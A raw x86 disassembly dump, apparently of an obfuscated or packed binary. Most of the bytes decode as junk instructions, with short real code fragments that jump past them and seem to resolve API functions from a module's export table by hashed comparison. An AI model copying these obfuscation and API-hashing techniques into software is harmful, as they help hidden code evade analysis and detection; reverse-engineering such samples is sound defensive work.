  40b8d4:	fstp   TBYTE PTR [ebx]
  40b8d6:	in     al,0x8
  40b8d8:	sub    esi,DWORD PTR [ecx+0x2b]
  40b8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8dc:	stc    
  40b8dd:	push   ebp
  40b8de:	push   edi
  40b8df:	cmp    DWORD PTR [ebx],ebx
  40b8e1:	dec    esp
  40b8e2:	repnz mov esi,0x5ee5fed6
  40b8e8:	xor    DWORD PTR [ebx],0xde13fd81
  40b8ee:	(bad)  
  40b8ef:	mov    esi,0xa3505c76
  40b8f4:	xchg   edi,eax
  40b8f5:	adc    eax,0x20a77e19
  40b8fa:	dec    ebx
  40b8fb:	sub    DWORD PTR [esi+eax*8+0x7ef2a5b9],ecx
  40b902:	lock pop edi
  40b904:	fisub  DWORD PTR [ecx+0x31]
  40b907:	mov    cl,0xa
  40b909:	fisubr DWORD PTR [edi+ebx*4]
  40b90c:	mov    ah,0x4f
  40b90e:	mov    bl,0xda
  40b910:	xchg   ebx,eax
  40b911:	jg     0x40b98c
  40b913:	cmp    dl,BYTE PTR [edi-0x64]
  40b916:	ja     0x40b8f5
  40b918:	pop    edx
  40b919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b91a:	jae    0x40b949
  40b91c:	pop    esi
  40b91d:	sahf   
  40b91e:	aas    
  40b91f:	mov    esi,0x37b04720
  40b924:	enter  0xc2ff,0xae
  40b928:	push   0x43
  40b92a:	pop    ds
  40b92b:	add    BYTE PTR [eax+edx*2],0x4c
  40b92f:	imul   edx,DWORD PTR [ebx-0x25],0x9
  40b933:	add    esi,DWORD PTR [ecx+0x2d87fc74]
  40b939:	mov    DWORD PTR [ebp-0x2c],ecx
  40b93c:	mov    eax,DWORD PTR [ebp-0x14]
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	in     al,dx
  40b965:	cmp    DWORD PTR [edi+0x7e3379c3],esp
  40b96b:	jle    0x40b923
  40b96d:	jle    0x40b9ed
  40b96f:	jle    0x40b974
  40b971:	retf   0x3ce9
  40b974:	inc    edx
  40b975:	pop    esi
  40b976:	push   ds
  40b977:	ja     0x40b9e4
  40b979:	enter  0xa4a,0xcf
  40b97d:	es sub al,0x53
  40b980:	pop    edi
  40b981:	cmp    ebx,DWORD PTR [ecx+0x13b1353a]
  40b987:	les    ebx,FWORD PTR [esi+0x71]
  40b98a:	aad    0x67
  40b98c:	jae    0x40b919
  40b98e:	adc    bl,BYTE PTR [eax-0x2aba1fa7]
  40b994:	ficom  DWORD PTR [edi+eax*4+0x4a]
  40b998:	sbb    BYTE PTR [edx],bl
  40b99a:	xor    eax,0xaaae4009
  40b99f:	dec    edx
  40b9a0:	push   esp
  40b9a1:	mov    ds:0x5809cfc,eax
  40b9a6:	(bad)  
  40b9a7:	dec    ebp
  40b9a8:	sub    al,bl
  40b9aa:	adc    eax,esi
  40b9ac:	jbe    0x40b938
  40b9ae:	adc    BYTE PTR [ecx+0x20],0x1d
  40b9b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b3:	mov    edi,0xa2e69684
  40b9b8:	dec    esi
  40b9b9:	or     ecx,esi
  40b9bb:	inc    edx
  40b9bc:	bound  edi,QWORD PTR [ebp+0xc517d81]
  40b9c2:	or     al,0x11
  40b9c4:	icebp  
  40b9c5:	pop    esi
  40b9c6:	hlt    
  40b9c7:	in     eax,0xeb
  40b9c9:	add    eax,0xf3bb1c0
  40b9ce:	push   esi
  40b9cf:	and    ah,BYTE PTR [ebx-0x6485234]
  40b9d5:	jecxz  0x40b9df
  40b9d7:	dec    esi
  40b9d8:	cs jge 0x40b9ab
  40b9db:	sub    BYTE PTR [ecx+ebx*4+0x66],0xba
  40b9e0:	xchg   ecx,eax
  40b9e1:	cmp    BYTE PTR [ebx+0x11e86c67],0x55
  40b9e8:	push   edx
  40b9e9:	inc    esp
  40b9ea:	pop    ecx
  40b9eb:	pop    eax
  40b9ec:	xchg   edx,eax
  40b9ed:	les    ecx,FWORD PTR ds:0xd30e666e
  40b9f3:	push   ds
  40b9f4:	cli    
  40b9f5:	(bad)  
  40b9f6:	mov    DWORD PTR [ebx],0x827d7385
  40b9fc:	in     al,dx
  40b9fd:	dec    ebp
  40b9fe:	push   ds
  40b9ff:	cld    
  40ba00:	repz rep outs dx,DWORD PTR ds:[esi]
  40ba03:	stos   BYTE PTR es:[edi],al
  40ba04:	int    0x79
  40ba06:	lahf   
  40ba07:	out    0xeb,al
  40ba09:	push   0xffffff88
  40ba0b:	cdq    
  40ba0c:	inc    esi
  40ba0d:	inc    edi
  40ba0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba0f:	jle    0x40b9ee
  40ba11:	pop    es
  40ba12:	popf   
  40ba13:	mov    DWORD PTR [ecx-0xfddee9a],eax
  40ba19:	enter  0x530a,0x98
  40ba1d:	inc    edi
  40ba1f:	mov    ebx,es
  40ba21:	jae    0x40b9b0
  40ba23:	sub    bl,BYTE PTR [ebp+0x35997af4]
  40ba29:	outs   dx,DWORD PTR ds:[esi]
  40ba2a:	inc    ax
  40ba2c:	cmp    DWORD PTR [esi+esi*4-0x4a10e54c],edx
  40ba33:	ins    DWORD PTR es:[edi],dx
  40ba34:	in     eax,dx
  40ba35:	loopne 0x40b9da
  40ba37:	jle    0x40b9c6
  40ba39:	inc    ebp
  40ba3a:	clc    
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock test eax,0xb1a8c721
  40ba78:	xor    BYTE PTR [esi+0x7e],bh
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	cld    
  40ba80:	cs (bad) 
  40ba83:	neg    DWORD PTR [ecx+0x66f6ab8e]
  40ba89:	call   0xf8ef:0xeafcde42
  40ba90:	inc    ebp
  40ba91:	mov    ch,dh
  40ba93:	ja     0x40ba9c
  40ba95:	jb     0x40bb0c
  40ba97:	dec    ebx
  40ba98:	aaa    
  40ba99:	pmuludq mm0,QWORD PTR [edx]
  40ba9c:	lods   eax,DWORD PTR ds:[esi]
  40ba9d:	std    
  40ba9e:	in     eax,dx
  40ba9f:	add    BYTE PTR [esp+ebx*4+0x4ad0e3a],ch
  40baa6:	xchg   edx,eax
  40baa7:	in     eax,dx
  40baa8:	push   edi
  40baa9:	jo     0x40baa5
  40baab:	int3   
  40baac:	shl    DWORD PTR [ebx+0x17c1ed65],0x62
  40bab3:	fs lock stos DWORD PTR es:[edi],eax
  40bab6:	cmp    bl,BYTE PTR [edi]
  40bab8:	dec    eax
  40bab9:	fcmovne st,st(3)
  40babb:	not    bh
  40babd:	sub    BYTE PTR [esi-0x71ff110d],0x6b
  40bac4:	popa   
  40bac5:	sub    al,0x53
  40bac7:	mov    ecx,0x533121f3
  40bacc:	jno    0x40bae9
  40bace:	ins    BYTE PTR es:[edi],dx
  40bacf:	stos   DWORD PTR es:[edi],eax
  40bad0:	add    al,0xe9
  40bad2:	ins    DWORD PTR es:[edi],dx
  40bad3:	mov    eax,ds:0xc7a1fa72
  40bad8:	stos   DWORD PTR es:[edi],eax
  40bad9:	push   edx
  40bada:	lahf   
  40badb:	fwait
  40badc:	cld    
  40badd:	mov    ch,0x9b
  40badf:	jge    0x40bb15
  40bae1:	xchg   ebp,eax
  40bae2:	sbb    esi,eax
  40bae4:	jno    0x40badb
  40bae6:	mov    al,ds:0xc58ad9ec
  40baeb:	push   cs
  40baec:	enter  0xb6df,0xc6
  40baf0:	ficom  DWORD PTR [eax]
  40baf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf3:	nop
  40baf4:	xchg   ebp,eax
  40baf5:	outs   dx,BYTE PTR ds:[esi]
  40baf6:	dec    ecx
  40baf7:	dec    ebx
  40baf8:	mov    BYTE PTR ds:0xe00e5560,dh
  40bafe:	out    dx,al
  40baff:	mov    bl,0x56
  40bb01:	nop
  40bb02:	pop    edx
  40bb03:	sub    DWORD PTR [ebp+0x70],edx
  40bb06:	jbe    0x40bac0
  40bb08:	mov    ch,0xf3
  40bb0a:	xchg   ebx,eax
  40bb0b:	xchg   ecx,eax
  40bb0c:	mov    dh,0xa0
  40bb0e:	js     0x40bae6
  40bb10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb11:	xor    eax,0x61bbfd9
  40bb16:	dec    edx
  40bb17:	xor    ecx,DWORD PTR [eax-0x11]
  40bb1a:	add    DWORD PTR [ecx-0x4608f7d4],eax
  40bb20:	dec    edi
  40bb21:	mov    bh,BYTE PTR [edi+eax*1+0x17]
  40bb25:	push   esi
  40bb26:	iret   
  40bb27:	sub    ebx,DWORD PTR [eax-0x56086e9d]
  40bb2d:	push   cs
  40bb2e:	mov    dh,0x9f
  40bb30:	push   eax
  40bb31:	xchg   ecx,eax
  40bb32:	xor    ebp,ecx
  40bb34:	jg     0x40bb63
  40bb36:	or     al,0x75
  40bb38:	dec    edi
  40bb39:	daa    
  40bb3a:	int    0x79
  40bb3c:	into   
  40bb3d:	and    esp,esi
  40bb3f:	inc    edx
  40bb40:	adc    ch,0xbf
  40bb43:	call   0xf83b:0x471410fd
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	and    edi,DWORD PTR [eax-0x1b]
  40bbc4:	dec    edx
  40bbc5:	mov    DWORD PTR [ecx],esi
  40bbc7:	jle    0x40bc47
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbce:	lahf   
  40bbcf:	sbb    edx,esi
  40bbd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd2:	cdq    
  40bbd3:	jno    0x40bbb7
  40bbd5:	cmc    
  40bbd6:	push   0x659655b6
  40bbdb:	pop    ebx
  40bbdc:	push   edx
  40bbdd:	pop    esi
  40bbde:	push   0xffffffb7
  40bbe0:	cwde   
  40bbe1:	(bad)  
  40bbe2:	cld    
  40bbe3:	mov    ebp,0xd5b78099
  40bbe8:	mov    BYTE PTR [eax-0x5b6951e8],ch
  40bbee:	mov    DWORD PTR [eax+0x31c0b168],esp
  40bbf4:	or     al,0x16
  40bbf6:	retf   
  40bbf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbf8:	popa   
  40bbf9:	cmp    bh,BYTE PTR ds:0xdbe72e25
  40bbff:	call   0xf2abc571
  40bc04:	add    al,0x86
  40bc06:	jmp    0x40bb92
  40bc08:	mov    dh,bl
  40bc0a:	nop
  40bc0b:	or     ch,BYTE PTR [edi+0x1ad286f]
  40bc11:	pop    ecx
  40bc12:	or     DWORD PTR [edi],ecx
  40bc14:	add    eax,0x23b2abff
  40bc19:	dec    ebx
  40bc1a:	mov    edi,DWORD PTR [ecx]
  40bc1c:	popa   
  40bc1d:	inc    edi
  40bc1e:	(bad)  
  40bc1f:	mov    ebp,0xb87bb1b9
  40bc24:	test   eax,0x319c36cc
  40bc29:	pop    ds
  40bc2a:	mov    cs,edx
  40bc2c:	cwde   
  40bc2d:	out    0xbf,al
  40bc2f:	mov    ebp,0x4c9dbbc9
  40bc34:	sub    DWORD PTR [esi],ebp
  40bc36:	popa   
  40bc37:	sbb    bh,BYTE PTR [edi]
  40bc39:	cwde   
  40bc3a:	push   eax
  40bc3b:	dec    esp
  40bc3c:	popa   
  40bc3d:	dec    ebx
  40bc3e:	dec    edx
  40bc3f:	push   ss
  40bc40:	add    DWORD PTR [edi+0x11ae0716],ebp
  40bc46:	sbb    dl,BYTE PTR ss:[ebx]
  40bc49:	jg     0x40bc1f
  40bc4b:	mov    ah,0xa8
  40bc4d:	fisttp WORD PTR [eax]
  40bc4f:	imul   eax,DWORD PTR [eax+ecx*1-0x12],0xffffff9c
  40bc54:	mov    ah,0x7a
  40bc56:	rcl    DWORD PTR [ecx],0x90
  40bc59:	sbb    edi,DWORD PTR [ebx+edx*1-0x422f72eb]
  40bc60:	jg     0x40bcdf
  40bc62:	lods   eax,DWORD PTR ds:[esi]
  40bc63:	out    0x4b,al
  40bc65:	xchg   edx,eax
  40bc66:	cli    
  40bc67:	cld    
  40bc68:	rcr    dl,0x62
  40bc6b:	xchg   ecx,eax
  40bc6c:	aam    0x79
  40bc6e:	aaa    
  40bc6f:	mov    bl,0x9a
  40bc71:	mov    ebp,0xc000de44
  40bc76:	lds    ecx,FWORD PTR [esi-0x1d]
  40bc79:	clc    
  40bc7a:	add    DWORD PTR [edi],ebx
  40bc7c:	adc    ebp,DWORD PTR [ecx+0x3dfa6108]
  40bc82:	in     eax,dx
  40bc83:	pop    ss
  40bc84:	inc    esi
  40bc85:	(bad)  
  40bc86:	icebp  
  40bc87:	mov    ch,0x2c
  40bc89:	sti    
  40bc8a:	addr16 push 0xc4a19d33
  40bc90:	pushf  
  40bc91:	test   DWORD PTR [eax-0x78a4b002],esp
  40bc97:	retf   
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	out    dx,eax
  40bcc2:	iret   
  40bcc3:	mov    ch,0x4a
  40bcc5:	shl    DWORD PTR [esi],0x7e
  40bcc8:	jle    0x40bc80
  40bcca:	jle    0x40bd4a
  40bccc:	jle    0x40bcab
  40bcce:	mov    bl,0xd7
  40bcd0:	jne    0x40bd00
  40bcd2:	push   esp
  40bcd3:	or     eax,0x6dc52614
  40bcd8:	fisttp WORD PTR [edx+0x623258d]
  40bcde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcdf:	push   0xbe04d91
  40bce4:	push   ebp
  40bce5:	push   esi
  40bce6:	test   eax,0x61408c85
  40bceb:	inc    eax
  40bcec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bced:	cmp    DWORD PTR [ebx-0x42],0xc4c415b3
  40bcf4:	(bad)  
  40bcf5:	pushf  
  40bcf6:	push   ds
  40bcf7:	rcr    esi,1
  40bcf9:	hlt    
  40bcfa:	sti    
  40bcfb:	xor    eax,0xcc0e97c4
  40bd00:	outs   dx,DWORD PTR ds:[esi]
  40bd01:	call   DWORD PTR [edx]
  40bd03:	shr    DWORD PTR [edi],1
  40bd05:	(bad)  
  40bd06:	sar    BYTE PTR [ebp-0x6a],cl
  40bd09:	or     DWORD PTR [ecx+ecx*1-0x6c],ebp
  40bd0d:	mov    ebp,0xe15f36c9
  40bd12:	test   DWORD PTR [edx+0x5a5676b2],edx
  40bd18:	loop   0x40bd7a
  40bd1a:	or     eax,0xb2105426
  40bd1f:	pop    ebp
  40bd20:	fcom   DWORD PTR [edi-0x52e549a7]
  40bd26:	jmp    0xf76f1e61
  40bd2b:	jl     0x40bcad
  40bd2d:	xor    BYTE PTR [esi-0x35],ah
  40bd30:	mov    ds:0xaa68800a,al
  40bd35:	pop    edx
  40bd36:	or     esp,DWORD PTR [ebx-0x59abf13b]
  40bd3c:	rol    DWORD PTR [ebx],0xf1
  40bd3f:	or     al,0x67
  40bd41:	clc    
  40bd42:	dec    edi
  40bd43:	test   DWORD PTR [eax+0x23bae905],eax
  40bd49:	sub    eax,0xa99f81fe
  40bd4e:	aam    0x83
  40bd50:	iret   
  40bd51:	mov    edx,0x58b1bcd0
  40bd56:	dec    edx
  40bd57:	add    DWORD PTR [ebx-0x3f453cee],esi
  40bd5d:	xchg   edx,eax
  40bd5e:	cmp    al,0xad
  40bd60:	xchg   ebx,eax
  40bd61:	mov    edx,0xd4762883
  40bd66:	pop    esp
  40bd67:	add    BYTE PTR [edx-0x3],ah
  40bd6a:	aas    
  40bd6b:	test   BYTE PTR [edi+0x38],al
  40bd6e:	lods   eax,DWORD PTR ds:[esi]
  40bd6f:	xlat   BYTE PTR ds:[ebx]
  40bd70:	xchg   edx,eax
  40bd71:	cwde   
  40bd72:	add    al,0x9
  40bd74:	popf   
  40bd75:	aad    0x96
  40bd77:	pop    ebx
  40bd78:	cmp    dl,dl
  40bd7a:	xor    eax,0xc9ba938b
  40bd7f:	fmul   DWORD PTR [esi+0x71e9d101]
  40bd85:	push   0xffffff8f
  40bd87:	xchg   BYTE PTR [ebp-0x3c],bl
  40bd8a:	add    al,0x52
  40bd8c:	rcpps  xmm0,XMMWORD PTR [edx]
  40bd8f:	out    dx,al
  40bd90:	or     BYTE PTR [edx],bh
  40bd92:	mov    bl,0xdd
  40bd94:	cmp    esi,DWORD PTR [ebx]
  40bd96:	sar    DWORD PTR [edx+0x32729f],0x3
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	cs js  0x40bd41
  40bdbf:	adc    eax,0x7e7e3719
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	or     al,0xb8
  40bdca:	xor    al,0xb
  40bdcc:	(bad)  
  40bdcd:	test   eax,0x931cb61e
  40bdd2:	or     ah,BYTE PTR [esi-0x4c]
  40bdd5:	in     al,dx
  40bdd6:	adc    eax,edi
  40bdd8:	dec    ebp
  40bdd9:	mov    cl,0x5f
  40bddb:	pop    esp
  40bddc:	(bad)  
  40bdde:	test   DWORD PTR [eax*1+0x8c6ae5d],edx
  40bde5:	jl     0x40be18
  40bde7:	mov    ds:0x93381e67,eax
  40bdec:	clc    
  40bded:	add    BYTE PTR [esp+esi*1],cl
  40bdf0:	or     BYTE PTR [edi+0x53fa6727],bl
  40bdf6:	aaa    
  40bdf7:	push   ebp
  40bdf8:	popa   
  40bdf9:	daa    
  40bdfa:	jno    0x40bdc4
  40bdfc:	enter  0x3d72,0xfd
  40be00:	add    esp,DWORD PTR [eax]
  40be02:	pushf  
  40be03:	aaa    
  40be04:	mov    cl,0xce
  40be06:	pop    ebx
  40be07:	jmp    0xc14086d9
  40be0c:	xchg   edi,eax
  40be0d:	mov    cl,0x8f
  40be0f:	outs   dx,DWORD PTR ds:[esi]
  40be10:	mov    ebp,0xea9100f2
  40be15:	in     al,0xf4
  40be17:	xor    eax,DWORD PTR [ebx-0x5d]
  40be1a:	xchg   BYTE PTR [eax+0x45],dl
  40be1d:	inc    edx
  40be1e:	and    BYTE PTR [esi],dl
  40be20:	icebp  
  40be21:	push   0x576052ce
  40be26:	adc    eax,0xc7c14a6f
  40be2b:	add    BYTE PTR [esi],bl
  40be2d:	nop
  40be2e:	mov    cl,0xb4
  40be30:	(bad)
  40be33:	jno    0x40bdd0
  40be35:	fisub  WORD PTR [ebx-0x6c]
  40be38:	xor    BYTE PTR [edx-0x20],ch
  40be3b:	pop    edi
  40be3c:	stc    
  40be3d:	xchg   ebx,eax
  40be3e:	retf   0xb6ca
  40be41:	outs   dx,BYTE PTR ds:[esi]
  40be42:	hlt    
  40be43:	xchg   edx,eax
  40be44:	fs retf 
  40be46:	xchg   esi,eax
  40be47:	pop    edx
  40be48:	dec    ecx
  40be49:	aad    0x91
  40be4b:	and    DWORD PTR [edi],edx
  40be4d:	stc    
  40be4e:	sub    eax,0xd470ed0
  40be53:	sub    dh,BYTE PTR [eax]
  40be55:	push   ebp
  40be56:	(bad)  
  40be57:	fistp  WORD PTR [esp+edi*1-0x3a]
  40be5b:	or     bh,al
  40be5d:	(bad)  
  40be5e:	xchg   edi,eax
  40be5f:	sbb    eax,0xbbe66c7d
  40be64:	repnz aas 
  40be66:	int    0x1d
  40be68:	fisubr DWORD PTR ds:0x5f8b804b
  40be6e:	dec    eax
  40be6f:	and    BYTE PTR [edi],0x78
  40be72:	dec    eax
  40be73:	nop
  40be74:	das    
  40be75:	(bad)
  40be78:	sub    al,0x7c
  40be7a:	pusha  
  40be7b:	and    eax,0x2451479f
  40be80:	xchg   edx,eax
  40be81:	call   0x4adedac7
  40be86:	loop   0x40be10
  40be88:	add    al,0xe8
  40be8a:	push   0xffffffd5
  40be8c:	add    DWORD PTR [eax-0x50f05b99],esi
  40be92:	add    ch,cl
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0xbe907640
  40bea6:	adc    DWORD PTR [eax+0x51],0x37
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	mov    dh,0x99
  40beb2:	fdiv   st,st(5)
  40beb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beb5:	je     0x40be57
  40beb7:	nop
  40beb8:	mov    esi,0x71055b2c
  40bebd:	ret    
  40bebe:	inc    esi
  40bebf:	or     esi,DWORD PTR [edx+0x10631d08]
  40bec5:	scas   eax,DWORD PTR es:[edi]
  40bec6:	lods   al,BYTE PTR ds:[esi]
  40bec7:	mov    ecx,0xf327e213
  40becc:	jmp    eax
  40bece:	mov    al,bh
  40bed0:	push   cs
  40bed1:	sub    edi,ecx
  40bed3:	je     0x40be98
  40bed5:	loopne 0x40be7f
  40bed7:	add    al,0x3d
  40bed9:	push   ds
  40beda:	lock inc ecx
  40bedc:	jne    0x40bf10
  40bede:	inc    ecx
  40bedf:	jg     0x40be72
  40bee1:	in     eax,0x70
  40bee3:	cdq    
  40bee4:	jne    0x40bea8
  40bee6:	adc    eax,0xc07551bd
  40beeb:	ret    
  40beec:	imul   esi,DWORD PTR [eax+0x1b],0x71
  40bef0:	data16 fidivr DWORD PTR [edx+0x305a16c4]
  40bef7:	sub    eax,0x19f36800
  40befc:	ds jg  0x40bf6c
  40beff:	addr16 icebp 
  40bf01:	sub    esp,DWORD PTR [edx]
  40bf03:	imul   esp,DWORD PTR [edx-0x6f63245b],0x61dd04d0
  40bf0d:	push   DWORD PTR [ebp+0x268fc279]
  40bf13:	sub    ebx,DWORD PTR [esi-0x22cda027]
  40bf19:	adc    esi,DWORD PTR [esi-0x11]
  40bf1c:	in     eax,0xa7
  40bf1e:	repnz bound esi,QWORD PTR [ecx+0x76]
  40bf22:	push   ss
  40bf23:	into   
  40bf24:	inc    ebp
  40bf25:	mov    dl,0x2d
  40bf27:	jo     0x40bf6e
  40bf29:	push   edx
  40bf2a:	(bad)  
  40bf2b:	mov    ah,dl
  40bf2d:	jno    0x40bf27
  40bf2f:	pop    ecx
  40bf30:	mov    WORD PTR [eax-0x3f19ab8f],cs
  40bf36:	pop    esp
  40bf37:	or     DWORD PTR [edi],edx
  40bf39:	retf   0x2c1e
  40bf3c:	fild   DWORD PTR [edi+0x5b]
  40bf3f:	pop    esp
  40bf40:	test   BYTE PTR [ecx+0xe],0x99
  40bf44:	scas   al,BYTE PTR es:[edi]
  40bf45:	popf   
  40bf46:	cmp    esi,eax
  40bf48:	mov    edx,esp
  40bf4a:	mov    DWORD PTR [esi-0x423b856],esi
  40bf50:	mov    ch,0xa7
  40bf52:	sbb    al,ch
  40bf54:	stos   DWORD PTR es:[edi],eax
  40bf55:	and    DWORD PTR [ebp+0x671d92ab],ebp
  40bf5b:	push   ss
  40bf5c:	lahf   
  40bf5d:	fild   QWORD PTR [esi+0x1c]
  40bf60:	rol    bh,cl
  40bf62:	test   al,0x76
  40bf64:	cdq    
  40bf65:	out    0x4c,eax
  40bf67:	xchg   ecx,eax
  40bf68:	out    0xa1,eax
  40bf6a:	xor    al,0x13
  40bf6c:	mov    ch,0xf6
  40bf6e:	xchg   ebx,eax
  40bf6f:	mov    dl,0x8a
  40bf71:	sub    dl,dl
  40bf73:	dec    eax
  40bf74:	in     eax,dx
  40bf75:	(bad)  
  40bf76:	sub    DWORD PTR [edi-0x75],ebp
  40bf79:	push   ebp
  40bf7a:	cld    
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	in     al,dx
  40bfae:	push   0xffffffc5
  40bfb0:	fisubr DWORD PTR [ecx-0x498181cc]
  40bfb6:	jle    0x40c036
  40bfb8:	jle    0x40bf56
  40bfba:	push   ebp
  40bfbb:	nop
  40bfbc:	test   DWORD PTR ds:0x32d2111c,ebp
  40bfc2:	ss in  eax,dx
  40bfc4:	scas   eax,DWORD PTR es:[edi]
  40bfc5:	enter  0xd047,0x53
  40bfc9:	xchg   BYTE PTR [esi+0x65],ah
  40bfcc:	(bad)  
  40bfce:	jmp    0x40bf82
  40bfd0:	sbb    esi,ebp
  40bfd2:	imul   esi,esp,0x24f8eef4
  40bfd8:	sahf   
  40bfd9:	imul   esp,DWORD PTR [ebx],0x45
  40bfdc:	lods   eax,DWORD PTR ds:[esi]
  40bfdd:	and    ch,dl
  40bfdf:	inc    ebp
  40bfe0:	ret    
  40bfe1:	mov    ebx,0x6633314
  40bfe6:	mov    bh,0xfe
  40bfe8:	retf   0x9061
  40bfeb:	std    
  40bfec:	jns    0x40c061
  40bfee:	inc    ecx
  40bfef:	sbb    dh,BYTE PTR [ebp-0x49]
  40bff2:	cdq    
  40bff3:	mov    edi,0x52a2a456
  40bff8:	aad    0xf
  40bffa:	mov    eax,DWORD PTR [esi]
  40bffc:	xor    edi,edx
  40bffe:	dec    esi
  40bfff:	je     0x40bff7
  40c001:	mov    ch,0xc5
  40c003:	add    esp,DWORD PTR [esi-0x58795d77]
  40c009:	mov    dh,0xe3
